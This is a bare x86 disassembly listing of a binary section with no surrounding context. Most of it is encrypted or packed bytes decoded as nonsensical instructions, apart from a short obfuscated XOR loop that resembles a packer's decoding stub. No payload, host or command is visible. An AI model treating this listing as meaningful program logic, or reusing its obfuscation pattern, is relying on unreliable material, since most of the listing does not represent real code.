  405988:	adc    dh,cl
  40598a:	fbld   TBYTE PTR [edx-0x3a780360]
  405990:	pop    ss
  405991:	push   ss
  405992:	push   ecx
  405993:	sub    eax,0x633398a
  405998:	inc    ebx
  405999:	int3   
  40599a:	mov    edi,0x4bca73d7
  40599f:	mov    ebx,0xa62f6d17
  4059a4:	adc    al,0xb2
  4059a6:	sub    BYTE PTR [ebx],0xb6
  4059a9:	jno    0x4059ab
  4059ab:	rcl    ch,0x8
  4059ae:	cmp    esi,esi
  4059b0:	lods   al,BYTE PTR ds:[esi]
  4059b1:	shl    BYTE PTR [eax],cl
  4059b3:	fiadd  WORD PTR [esi-0x23]
  4059b6:	mov    cl,0xe3
  4059b8:	pop    ebx
  4059b9:	test   eax,0xf89d2db0
  4059be:	mov    eax,0xfeb45c9e
  4059c3:	es inc ebx
  4059c5:	loope  0x405a12
  4059c7:	xchg   edi,eax
  4059c8:	(bad)  [edi-0x22]
  4059cb:	lods   al,BYTE PTR ds:[esi]
  4059cc:	xchg   DWORD PTR [esi+0x16],ebx
  4059cf:	fadd   QWORD PTR [edi-0x8b8ac43]
  4059d5:	jp     0x4059cb
  4059d7:	cdq    
  4059d8:	push   edi
  4059d9:	sbb    al,0xe
  4059db:	pop    es
  4059dc:	mov    ecx,0x6cf8a3b5
  4059e1:	sub    BYTE PTR [ecx],dh
  4059e3:	pop    es
  4059e4:	dec    edx
  4059e5:	adc    cl,al
  4059e7:	pop    ds
  4059e8:	pop    ss
  4059e9:	leave  
  4059ea:	icebp  
  4059eb:	xchg   bp,ax
  4059ed:	push   ss
  4059ee:	xor    esi,ecx
  4059f0:	fild   QWORD PTR [edx-0x42]
  4059f3:	inc    ebp
  4059f4:	jmp    0xa0f00ea4
  4059f9:	test   al,0xc9
  4059fb:	data16 sbb BYTE PTR [esi],dh
  4059fe:	das    
  4059ff:	mov    edi,edx
  405a01:	inc    ebp
  405a02:	cmp    esi,DWORD PTR [ecx]
  405a04:	xchg   DWORD PTR [edi-0x331039b5],eax
  405a0a:	pop    es
  405a0b:	das    
  405a0c:	shl    BYTE PTR [edi-0x7b],cl
  405a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a10:	cmp    DWORD PTR [edx],edi
  405a12:	dec    esi
  405a13:	call   0xc318:0xfecbbbdd
  405a1a:	xor    dl,BYTE PTR [edx]
  405a1c:	ds int3 
  405a1e:	push   ebx
  405a1f:	push   0xf17e49d8
  405a24:	pop    ds
  405a25:	add    DWORD PTR cs:[eax],edi
  405a28:	repnz cmp BYTE PTR [edx-0x33],bh
  405a2c:	lahf   
  405a2d:	pop    esi
  405a2e:	nop
  405a2f:	into   
  405a30:	stc    
  405a31:	xchg   ebp,eax
  405a32:	popf   
  405a33:	repz jo 0x405a2b
  405a36:	sub    al,cl
  405a38:	or     ebp,DWORD PTR [esi]
  405a3a:	mov    edx,0x95a648a9
  405a3f:	popf   
  405a40:	js     0x405a7b
  405a42:	mov    ch,0xcd
  405a44:	mov    bh,0x97
  405a46:	jmp    0xb5f3:0xa7e62b20
  405a4d:	repnz pop edi
  405a4f:	lock out dx,al
  405a51:	(bad)  
  405a52:	pop    esp
  405a53:	out    dx,eax
  405a54:	inc    ebx
  405a55:	adc    al,0x9b
  405a57:	fild   DWORD PTR gs:0xc989741a
  405a5e:	jnp    0x4059e4
  405a60:	test   eax,0x5fec0429
  405a65:	cmp    al,BYTE PTR gs:[eax-0x79fe4174]
  405a6c:	adc    edi,DWORD PTR [eax+edx*1-0x36e3f70d]
  405a73:	repnz in eax,0xa1
  405a76:	cmp    al,0xfd
  405a78:	mov    ds:0x4155ef3a,eax
  405a7d:	adc    al,0x17
  405a7f:	add    DWORD PTR [edi-0x6d],eax
  405a82:	ja     0x405acd
  405a84:	stc    
  405a85:	fucomip st,st(1)
  405a87:	fwait
  405a88:	call   0xfc58857
  405a8d:	push   0x67328dc8
  405a92:	add    BYTE PTR [ebx],al
  405a94:	inc    ecx
  405a95:	mov    ah,0xcb
  405a97:	dec    ebx
  405a98:	jbe    0x405b0c
  405a9a:	cmp    dl,BYTE PTR [eax]
  405a9c:	sbb    ecx,DWORD PTR [ebx]
  405a9e:	dec    edx
  405a9f:	(bad)  
  405aa0:	test   eax,0xc72b7eb6
  405aa5:	lea    eax,[edi-0x5cdfb989]
  405aab:	(bad)  
  405aac:	push   es
  405aad:	imul   esp,ebp,0xeae8409
  405ab3:	pop    ecx
  405ab4:	inc    ebp
  405ab5:	es xchg ecx,eax
  405ab7:	mov    ds:0x95158de1,al
  405abc:	mov    dl,0xed
  405abe:	cmp    BYTE PTR [esi+0x230aca43],dh
  405ac4:	rcr    BYTE PTR [ebp-0x39f7b5fc],1
  405aca:	cli    
  405acb:	loopne 0x405a4f
  405acd:	pop    eax
  405ace:	jnp    0x405a79
  405ad0:	(bad)  
  405ad1:	cmp    dh,BYTE PTR [ebx]
  405ad3:	fmul   QWORD PTR [eax-0x50]
  405ad6:	adc    DWORD PTR [edi+0x68],ebp
  405ad9:	inc    eax
  405ada:	cmp    BYTE PTR [edi+0x10],bh
  405add:	jo     0x405b07
  405adf:	sbb    DWORD PTR [eax],eax
  405ae1:	ja     0x405a92
  405ae3:	xchg   esp,eax
  405ae4:	sub    eax,DWORD PTR [ebp-0x75]
  405ae7:	popa   
  405ae8:	enter  0xb9f6,0x1b
  405aec:	int    0x56
  405aee:	clc    
  405aef:	mov    ecx,0xb4b14e11
  405af4:	adc    ebx,ecx
  405af6:	xor    esp,DWORD PTR [eax-0x41]
  405af9:	fs out 0xa4,al
  405afc:	add    dh,0x21
  405aff:	dec    esi
  405b00:	repz or DWORD PTR [ecx-0x26ce0160],0x878a534d
  405b0b:	fmul   DWORD PTR [eax-0x3debd315]
  405b11:	pop    ebx
  405b12:	not    BYTE PTR [edi-0x6e565324]
  405b18:	adc    bl,BYTE PTR [ebx+0x4f]
  405b1b:	imul   eax,DWORD PTR [ebx-0x653ae5bc],0xffffff97
  405b22:	adc    al,0x9
  405b24:	sbb    eax,0x7068175b
  405b29:	pop    esp
  405b2a:	imul   ebx,DWORD PTR [eax-0x4119ad30],0x4d89e673
  405b34:	adc    BYTE PTR [ecx+0xc6d],bh
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43371b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4336d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433723,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43376f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4337af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x9cf32d51
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c4b
  405be0:	push   es
  405be1:	inc    ecx
  405be2:	imul   edx,DWORD PTR [ecx+ecx*4-0x5a],0x6a17a872
  405bea:	mov    al,ds:0x4f767d37
  405bef:	(bad)  
  405bf0:	mov    bh,0x6a
  405bf2:	add    BYTE PTR [edi-0x410730b1],ch
  405bf8:	add    al,0x70
  405bfa:	cli    
  405bfb:	pushf  
  405bfc:	and    eax,0x5e450303
  405c01:	ret    
  405c02:	mov    ecx,0x8f67d410
  405c07:	mov    esp,0x1412a2b1
  405c0c:	fs (bad) 
  405c0f:	mov    gs,WORD PTR [ebx]
  405c11:	(bad)  [esi]
  405c13:	push   cs
  405c14:	push   ss
  405c15:	aas    
  405c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c17:	mov    si,0xf65e
  405c1b:	retf   0xbcaf
  405c1e:	mov    esi,0x9bf40601
  405c23:	push   esi
  405c24:	mov    bh,0x9f
  405c26:	arpl   WORD PTR [ebp+0x5f],si
  405c29:	jecxz  0x405c59
  405c2b:	cs std 
  405c2d:	sub    ebx,esp
  405c2f:	fist   WORD PTR [edi-0x4cc388a1]
  405c35:	mov    ds:0x7c4a6bb2,al
  405c3a:	and    eax,0x34f489d2
  405c3f:	dec    esi
  405c40:	adc    bh,al
  405c42:	aam    0x3e
  405c44:	loop   0x405bf1
  405c46:	stc    
  405c47:	xchg   DWORD PTR [esp+ebx*8-0x12e53d4d],edi
  405c4e:	cmp    edx,esi
  405c50:	mov    cl,0x60
  405c52:	mov    ds:0x75ad057f,al
  405c57:	xor    edx,eax
  405c59:	ror    DWORD PTR [edi+edx*1],cl
  405c5c:	js     0x405c39
  405c5e:	out    dx,eax
  405c5f:	cli    
  405c60:	mov    eax,ebp
  405c62:	jne    0x405c04
  405c64:	or     ch,0x1f
  405c67:	repz mov WORD PTR [esi+0x6de99f33],ss
  405c6e:	loopne 0x405c31
  405c70:	xchg   ebx,eax
  405c71:	jae    0x405cbd
  405c73:	fcom   st(2)
  405c75:	test   eax,0x23535ee2
  405c7a:	arpl   WORD PTR [edi+edx*1-0x73],ax
  405c7e:	inc    BYTE PTR [ebx-0x530a2da0]
  405c84:	push   0xffffffc8
  405c86:	push   ecx
  405c87:	sbb    eax,0x997f76dd
  405c8c:	adc    DWORD PTR [edx],ebx
  405c8e:	call   0x6568:0x5c69d1cd
  405c95:	and    DWORD PTR [ebp+eiz*1+0x77],esi
  405c99:	mov    ch,0x93
  405c9b:	pop    es
  405c9c:	pop    esp
  405c9d:	inc    ecx
  405c9e:	mov    ds:0xdc90f2f3,eax
  405ca3:	mov    ch,0x93
  405ca5:	test   al,0x7a
  405ca7:	mov    esi,0x279726e6
  405cac:	(bad)  
  405cad:	out    dx,eax
  405cae:	les    edi,FWORD PTR [ebp-0x4b8b8213]
  405cb4:	in     eax,0x7f
  405cb6:	cmp    al,0xd5
  405cb8:	fstp   DWORD PTR [edi+eiz*8-0x44]
  405cbc:	and    dl,BYTE PTR [eax-0x344d795d]
  405cc2:	pushf  
  405cc3:	or     al,BYTE PTR ds:0xef53b9a6
  405cc9:	mov    WORD PTR [edi-0x34],cs
  405ccc:	jge    0x405d32
  405cce:	popf   
  405ccf:	pop    ds
  405cd0:	jecxz  0x405ce5
  405cd2:	int    0xe5
  405cd4:	xchg   esp,eax
  405cd5:	stc    
  405cd6:	pop    ebx
  405cd7:	ror    DWORD PTR [eax-0x6981f7da],cl
  405cdd:	sbb    BYTE PTR [ecx],dh
  405cdf:	call   0xf36541b0
  405ce4:	push   ds
  405ce5:	and    eax,0xb0ee0fad
  405cea:	mov    al,ds:0xcffebcf9
  405cef:	inc    esp
  405cf0:	(bad)  
  405cf1:	test   eax,0x8760fbc2
  405cf6:	jae    0x405cb5
  405cf8:	dec    ebx
  405cf9:	jmp    0xca9d:0xf123353
  405d00:	outs   dx,DWORD PTR ds:[esi]
  405d01:	les    edi,FWORD PTR [edx]
  405d03:	mov    esp,0x9d56a890
  405d08:	ret    0x3047
  405d0b:	cmp    esp,DWORD PTR [eax]
  405d0d:	loop   0x405d21
  405d0f:	jge    0x405d6d
  405d11:	sub    esp,DWORD PTR [edi-0x2b045e92]
  405d17:	jmp    0x18f836c5
  405d1c:	in     eax,0xd6
  405d1e:	xchg   ebp,eax
  405d1f:	out    dx,eax
  405d20:	or     bl,BYTE PTR [ebx-0x2084417d]
  405d26:	mov    ah,0x7a
  405d28:	jmp    0xd51d:0x6226af1b
  405d2f:	jecxz  0x405cd6
  405d31:	add    eax,edi
  405d33:	(bad)  
  405d34:	xlat   BYTE PTR ds:[ebx]
  405d35:	mov    ebx,0xa88f0c1c
  405d3a:	add    al,0x9
  405d3c:	mov    esi,0x6a6c8593
  405d41:	int    0x34
  405d43:	test   esp,ebx
  405d45:	sub    al,0x2f
  405d47:	xchg   edx,eax
  405d48:	lock repz idiv DWORD PTR [edx]
  405d4c:	inc    esi
  405d4d:	mov    eax,0x18dad16a
  405d52:	fist   WORD PTR [esi+ebx*4]
  405d55:	lods   eax,DWORD PTR ds:[esi]
  405d56:	dec    ax
  405d58:	outs   dx,BYTE PTR ds:[esi]
  405d59:	xor    eax,0x5b4129bc
  405d5e:	sti    
  405d5f:	mov    al,ds:0x7eda5353
  405d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d66:	push   ebx
  405d67:	push   0x246cacf5
  405d6c:	nop
  405d6d:	and    al,0xe5
  405d6f:	addr16 pop es
  405d71:	xchg   BYTE PTR [eax+0xe57e039],bh
  405d77:	aas    
  405d78:	jp     0x405d1a
  405d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d7b:	(bad)  
  405d7c:	not    edx
  405d7e:	mov    ah,0xf
  405d80:	ins    DWORD PTR es:[edi],dx
  405d81:	cs jecxz 0x405d7e
  405d84:	clc    
  405d85:	push   ebp
  405d86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d87:	cwde   
  405d88:	jp     0x405d19
  405d8a:	int    0xb2
  405d8c:	dec    ebp
  405d8d:	mov    cl,BYTE PTR [ebp-0x45eb1345]
  405d93:	icebp  
  405d94:	fisub  DWORD PTR [eax+0x771161]
  405d9a:	rcr    DWORD PTR [ecx],1
  405d9c:	in     al,0xfb
  405d9e:	mov    edi,DWORD PTR [ebx+0xb]
  405da1:	aaa    
  405da2:	lods   al,BYTE PTR gs:[esi]
  405da4:	test   BYTE PTR [ebx+0x53e342d7],dl
  405daa:	sub    dl,BYTE PTR [edx-0x1]
  405dad:	xchg   ebp,eax
  405dae:	jl     0x405dcc
  405db0:	rcr    DWORD PTR [eax],cl
  405db2:	loop   0x405d5f
  405db4:	or     ebx,DWORD PTR [ecx+0x28]
  405db7:	push   esp
  405db8:	mov    ebp,0x43ed54f6
  405dbd:	xchg   esi,eax
  405dbe:	add    BYTE PTR [ecx],bl
  405dc0:	repz xchg esp,eax
  405dc2:	int    0xf4
  405dc4:	add    ecx,DWORD PTR [ebx]
  405dc6:	leave  
  405dc7:	pop    edx
  405dc8:	daa    
  405dc9:	lods   eax,DWORD PTR ds:[esi]
  405dca:	cmp    DWORD PTR [ecx],edx
  405dcc:	inc    ebx
  405dcd:	cld    
  405dce:	cmp    BYTE PTR [edi-0xe],dh
  405dd1:	add    DWORD PTR [edi+0x3b37aabc],edi
  405dd7:	in     al,dx
  405dd8:	cld    
  405dd9:	xchg   BYTE PTR [ecx-0x34328ef5],ah
  405ddf:	pop    ebx
  405de0:	int    0xcc
  405de2:	aas    
  405de3:	lods   eax,DWORD PTR ds:[esi]
  405de4:	call   0x39c3:0xe42c00f6
  405deb:	xchg   edi,eax
  405dec:	(bad)  
  405ded:	dec    edx
  405dee:	inc    ebp
  405def:	int    0xf
  405df1:	jmp    0x8f706360
  405df6:	popa   
  405df7:	aam    0x71
  405df9:	and    edx,esp
  405dfb:	cmp    DWORD PTR [edx-0xd],edx
  405dfe:	pop    eax
  405dff:	(bad)  
  405e00:	pop    ebp
  405e01:	or     BYTE PTR [edx-0x4b0ac343],cl
  405e07:	dec    edx
  405e08:	pop    ebx
  405e09:	popa   
  405e0a:	pop    ebp
  405e0b:	(bad)  
  405e0c:	(bad)  
  405e0d:	cmc    
  405e0e:	push   es
  405e0f:	sti    
  405e10:	mov    bl,0x4c
  405e12:	mov    ebp,0xb322c250
  405e17:	dec    esp
  405e18:	arpl   WORD PTR [edi+ebp*2],si
  405e1b:	lahf   
  405e1c:	xlat   BYTE PTR ds:[ebx]
  405e1d:	or     DWORD PTR [edi],edi
  405e1f:	sbb    esi,ebx
  405e21:	jl     0x405e1a
  405e23:	xor    cl,al
  405e25:	cld    
  405e26:	pop    es
  405e27:	push   edi
  405e28:	sbb    DWORD PTR [esi+edx*2],0xb
  405e2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e2d:	push   edi
  405e2e:	and    DWORD PTR [edi+0x6c],0x758737ce
  405e35:	arpl   WORD PTR [edx+esi*2-0x5f1c0a0],bx
  405e3c:	daa    
  405e3d:	mov    dl,dh
  405e3f:	mov    edx,es
  405e41:	rcr    cl,cl
  405e43:	jmp    0x405eb8
  405e45:	jne    0x405dfd
  405e47:	or     dl,BYTE PTR [eax]
  405e49:	out    dx,al
  405e4a:	xchg   edx,eax
  405e4b:	pcmpeqd mm1,QWORD PTR [ebx+esi*4-0x1eccba42]
  405e53:	jge    0x405e37
  405e55:	mov    dl,0xbd
  405e57:	call   DWORD PTR [edx]
  405e59:	and    BYTE PTR [edi-0x6f],0xbe
  405e5d:	mov    ch,0xd8
  405e5f:	in     eax,0x70
  405e61:	sahf   
  405e62:	jg     0x405e7a
  405e64:	std    
  405e65:	xchg   DWORD PTR [ebp+0xe6e6cd9],esi
  405e6b:	mov    ebx,0x18592ff1
  405e70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e71:	sbb    al,0xb2
  405e73:	cli    
  405e74:	sub    al,0xce
  405e76:	xchg   edi,eax
  405e77:	xor    BYTE PTR [ecx],dh
  405e79:	mov    ds:0x697657ef,eax
  405e7e:	and    BYTE PTR [eax],bl
  405e80:	fisubr WORD PTR [ecx-0x13c0fd50]
  405e86:	sbb    BYTE PTR [ebp+0x53a39566],dl
  405e8c:	test   eax,0x8d78b602
  405e91:	xor    cl,BYTE PTR [edi+0x4eb1080e]
  405e97:	and    ebx,edx
  405e99:	hlt    
  405e9a:	sub    DWORD PTR [ebx+0x656f1303],esi
  405ea0:	jnp    0x405ef3
  405ea2:	and    al,BYTE PTR [edi+0x1745075c]
  405ea8:	(bad)  
  405eaa:	lods   eax,DWORD PTR ds:[esi]
  405eab:	fwait
  405eac:	or     ebx,DWORD PTR [ebx]
  405eae:	and    al,0xcc
  405eb0:	sbb    bh,BYTE PTR [edi]
  405eb2:	popa   
  405eb3:	mov    ebp,0x3a7e669c
  405eb8:	sbb    eax,0x9787b7c0
  405ebd:	fimul  DWORD PTR [ecx-0x59abefe4]
  405ec3:	xor    BYTE PTR [esi],bh
  405ec5:	in     eax,dx
  405ec6:	cld    
  405ec7:	fst    DWORD PTR [ebp-0x28c1876e]
  405ecd:	in     al,0x20
  405ecf:	adc    eax,0x6d2bbf30
  405ed4:	jns    0x405e74
  405ed6:	(bad)  
  405ed8:	lods   eax,DWORD PTR ds:[esi]
  405ed9:	lods   al,BYTE PTR ds:[esi]
  405eda:	add    al,0x52
  405edc:	jb     0x405ee1
  405ede:	jp     0x405eea
  405ee0:	cmp    eax,0xab9aa7ad
  405ee5:	ret    0x1168
  405ee8:	rcr    edi,cl
  405eea:	dec    edi
  405eeb:	mov    bh,0xa3
  405eed:	lds    esi,FWORD PTR [ebp+0x31]
  405ef0:	lods   eax,DWORD PTR ds:[esi]
  405ef1:	retf   
  405ef2:	jae    0x405f0e
  405ef4:	sbb    bl,dh
  405ef6:	sti    
  405ef7:	push   eax
  405ef8:	and    esp,DWORD PTR [ebp+edx*2-0x2c]
  405efc:	xchg   DWORD PTR [edx-0xf5cd506],esp
  405f02:	sbb    DWORD PTR [esi],ecx
  405f04:	mov    dh,0x2
  405f06:	inc    eax
  405f07:	add    BYTE PTR [ebx+0x6b43c06f],dl
  405f0d:	xchg   DWORD PTR [edx-0xeccfbe6],ebp
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [eax-0x598663ea],cs
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	cmp    eax,0xcfafc73
  405f37:	rcr    BYTE PTR [edi],0x82
  405f3a:	dec    ebp
  405f3b:	repz push eax
  405f3d:	les    eax,FWORD PTR [esi]
  405f3f:	push   ss
  405f40:	cmp    DWORD PTR [ebx],eax
  405f42:	call   0x8e80:0x7a4126b4
  405f49:	jno    0x405fb9
  405f4b:	mov    ds:0x764c4596,al
  405f50:	test   esi,edx
  405f52:	cli    
  405f53:	jbe    0x405ee9
  405f55:	dec    ebx
  405f56:	mov    esp,0xc5b19115
  405f5b:	stc    
  405f5c:	add    esp,DWORD PTR [ebx+esi*4-0x1282f314]
  405f63:	push   ss
  405f64:	mov    dh,BYTE PTR [ebx]
  405f66:	jae    0x405f48
  405f68:	xlat   BYTE PTR ds:[ebx]
  405f69:	loope  0x405f93
  405f6b:	arpl   WORD PTR ds:0x3639a36f,di
  405f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f72:	gs daa 
  405f74:	mov    al,ds:0xbc1f99d5
  405f79:	fwait
  405f7a:	icebp  
  405f7b:	pop    ecx
  405f7c:	rcr    BYTE PTR [ecx+0x4458a9f9],1
  405f82:	adc    eax,0x4396622d
  405f87:	mov    edx,0xfea87349
  405f8c:	icebp  
  405f8d:	fwait
  405f8e:	(bad)  
  405f8f:	sbb    eax,0xac05d7b8
  405f94:	lds    esp,FWORD PTR [eax-0x2dd041c]
  405f9a:	scas   eax,DWORD PTR es:[edi]
  405f9b:	js     0x405ffd
  405f9d:	sbb    ch,dl
  405f9f:	sti    
  405fa0:	adc    eax,0x28d04673
  405fa5:	int    0xec
  405fa7:	fprem  
  405fa9:	in     al,dx
  405faa:	inc    ebx
  405fab:	mov    ebx,0xc97793a2
  405fb0:	add    al,0x1b
  405fb2:	or     ebp,esp
  405fb4:	int3   
  405fb5:	push   eax
  405fb6:	xchg   DWORD PTR [ebp+0x1201d18],eax
  405fbc:	lods   eax,DWORD PTR ds:[esi]
  405fbd:	(bad)  
  405fbe:	dec    esi
  405fbf:	jno    0x405fcd
  405fc1:	mov    edi,0x578b351a
  405fc6:	xchg   edx,eax
  405fc7:	mov    cs,WORD PTR [esi]
  405fc9:	inc    edi
  405fca:	jo     0x405fe7
  405fcc:	cmp    ebp,ebx
  405fce:	pop    ebp
  405fcf:	mov    eax,0xdbb3e10
  405fd4:	outs   dx,DWORD PTR ds:[esi]
  405fd5:	stc    
  405fd6:	popa   
  405fd7:	dec    ebx
  405fd8:	cmp    eax,0x3ded7dc9
  405fdd:	fwait
  405fde:	cld    
  405fdf:	xchg   ebx,eax
  405fe0:	dec    ecx
  405fe1:	scas   eax,DWORD PTR es:[edi]
  405fe2:	popa   
  405fe3:	xchg   ecx,eax
  405fe4:	arpl   WORD PTR [edi+ecx*1+0x505cc4d1],bx
  405feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fec:	mov    esp,0xdac7abb8
  405ff1:	iret   
  405ff2:	inc    edx
  405ff3:	jg     0x405fcf
  405ff5:	dec    esi
  405ff6:	xchg   ecx,eax
  405ff7:	pop    eax
  405ff8:	inc    ebp
  405ff9:	pop    ebx
  405ffa:	mov    al,0xf
  405ffc:	imul   ebx,DWORD PTR ds:0xd76f157c,0x618c1ff5
  406006:	add    al,0x7
  406008:	adc    bl,0x29
  40600b:	dec    ecx
  40600c:	popa   
  40600d:	sahf   
  40600e:	inc    esi
  40600f:	ficom  WORD PTR [esi+eax*2+0x6cd2fc4d]
  406016:	lds    ebx,FWORD PTR [ecx-0x31e24fcf]
  40601c:	in     eax,dx
  40601d:	sbb    ebp,0xc1cb35de
  406023:	push   cs
  406024:	inc    edx
  406025:	popf   
  406026:	mov    eax,ds:0xa37182e2
  40602b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40602c:	jo     0x406034
  40602e:	or     BYTE PTR [esi],0x15
  406031:	idiv   DWORD PTR [ebx]
  406033:	inc    esp
  406034:	outs   dx,BYTE PTR ds:[esi]
  406035:	retf   0xaa17
  406038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406039:	inc    edx
  40603a:	int    0x5d
  40603c:	dec    edx
  40603d:	retf   
  40603e:	sbb    DWORD PTR [ebx],edx
  406040:	mov    al,BYTE PTR [eax]
  406042:	ret    
  406043:	paddusb mm4,QWORD PTR [ebp+0x761d8384]
  40604a:	sub    eax,0xbc447357
  40604f:	ins    BYTE PTR es:[edi],dx
  406050:	push   ecx
  406051:	mov    ch,BYTE PTR [ebx+0x7d36d601]
  406057:	mov    bh,bl
  406059:	mov    dh,0xed
  40605b:	out    0x9f,al
  40605d:	(bad)  
  40605e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40605f:	adc    BYTE PTR [ebp+0xdb4d579],dh
  406065:	scas   al,BYTE PTR es:[edi]
  406066:	cli    
  406067:	pop    eax
  406068:	or     cl,0xa2
  40606b:	pop    edi
  40606c:	or     eax,0x1453982c
  406071:	cwde   
  406072:	into   
  406073:	lds    edx,FWORD PTR [ecx]
  406075:	(bad)  [esi+edi*8+0x4fb8c345]
  40607c:	pop    ss
  40607d:	js     0x4060bb
  40607f:	test   eax,0x9300464c
  406084:	inc    ebx
  406085:	pop    esp
  406086:	clc    
  406087:	arpl   bp,si
  406089:	(bad)  
  40608a:	neg    DWORD PTR [edx-0x25a727bc]
  406090:	scas   al,BYTE PTR es:[di]
  406092:	out    0x86,al
  406094:	cmp    BYTE PTR [ecx+0x4e8faab8],bh
  40609a:	dec    ecx
  40609b:	ret    
  40609c:	adc    edx,DWORD PTR [edx+0x72]
  40609f:	mov    WORD PTR [esi+0x60],cs
  4060a2:	xor    ah,BYTE PTR [edi]
  4060a4:	or     BYTE PTR [esi],ch
  4060a6:	dec    ebp
  4060a7:	push   sp
  4060a9:	out    dx,eax
  4060aa:	mov    al,ds:0xf61a501a
  4060af:	ret    0xb045
  4060b2:	leave  
  4060b3:	jne    0x406115
  4060b5:	inc    eax
  4060b6:	std    
  4060b7:	shl    DWORD PTR [edx+0x78],0xc7
  4060bb:	inc    edi
  4060bc:	adc    al,0xd2
  4060be:	push   esi
  4060bf:	outs   dx,DWORD PTR ds:[esi]
  4060c0:	add    BYTE PTR [ebx-0x5b],ch
  4060c3:	push   ds
  4060c4:	in     eax,dx
  4060c5:	cli    
  4060c6:	out    0x58,al
  4060c8:	xor    eax,0xcdd107b2
  4060cd:	and    DWORD PTR [ecx],ebp
  4060cf:	add    ebp,0xa3de824b
  4060d5:	iret   
  4060d6:	xchg   ebx,eax
  4060d7:	pop    edi
  4060d8:	mov    esp,0xde276d75
  4060dd:	mul    BYTE PTR [edx]
  4060df:	pop    edx
  4060e0:	(bad)  
  4060e1:	rcl    DWORD PTR [ebp+0x62d96528],1
  4060e7:	add    al,0x12
  4060e9:	or     DWORD PTR [eax+0x25],edi
  4060ec:	inc    ecx
  4060ed:	mov    edx,0xd622469a
  4060f2:	cmp    al,0x71
  4060f4:	sbb    edi,ebp
  4060f6:	pop    DWORD PTR [esi+ebx*2-0x23]
  4060fa:	push   cs
  4060fb:	ret    0x8253
  4060fe:	enter  0x371f,0x23
  406102:	add    ch,BYTE PTR [ebx]
  406104:	jno    0x406122
  406106:	jecxz  0x406100
  406108:	jae    0x4060df
  40610a:	call   0x6e68:0x55628826
  406111:	lods   eax,DWORD PTR ds:[esi]
  406112:	clc    
  406113:	stos   BYTE PTR es:[edi],al
  406114:	push   es
  406115:	dec    esi
  406116:	cmp    BYTE PTR [ebx],0x40
  406119:	lods   eax,DWORD PTR ds:[esi]
  40611a:	fsub   QWORD PTR fs:[edi+0x3f]
  40611e:	sub    esp,ebx
  406120:	repz xor BYTE PTR es:[edx+eiz*8+0x36dcddff],0xab
  40612a:	xchg   edi,eax
  40612b:	mov    edx,ds
  40612d:	inc    ebp
  40612e:	test   BYTE PTR [ebx],bh
  406130:	cld    
  406131:	cmp    ecx,DWORD PTR [eax+edi*8+0x1e]
  406135:	rol    BYTE PTR ds:0x22199d79,1
  40613b:	and    ebx,ebp
  40613d:	push   0xdc0d9ead
  406142:	mov    ebx,DWORD PTR [esi-0x1d]
  406145:	jl     0x40617d
  406147:	repz out 0x9f,al
  40614a:	dec    ebx
  40614b:	or     eax,0x275b011a
  406150:	sbb    edx,DWORD PTR [edx+0x67daf545]
  406156:	rcl    eax,0xd1
  406159:	into   
  40615a:	in     eax,dx
  40615b:	out    dx,al
  40615c:	cwde   
  40615d:	push   ecx
  40615e:	xchg   ecx,eax
  40615f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406160:	frstor [ebx]
  406162:	comiss xmm0,DWORD PTR [edx+0x7d16449]
  406169:	push   esp
  40616a:	pop    ss
  40616b:	fld    DWORD PTR [edi+0x28f5b7f9]
  406171:	dec    edx
  406172:	test   DWORD PTR [ecx-0x7a],ecx
  406175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406176:	ret    0x9765
  406179:	leave  
  40617a:	and    ch,bh
  40617c:	repnz loop 0x406133
  40617f:	add    al,0xa6
  406181:	mov    esp,0x642e1a8
  406186:	std    
  406187:	pop    ebx
  406188:	iret   
  406189:	shr    DWORD PTR [edx+0x1b],cl
  40618c:	xchg   ecx,eax
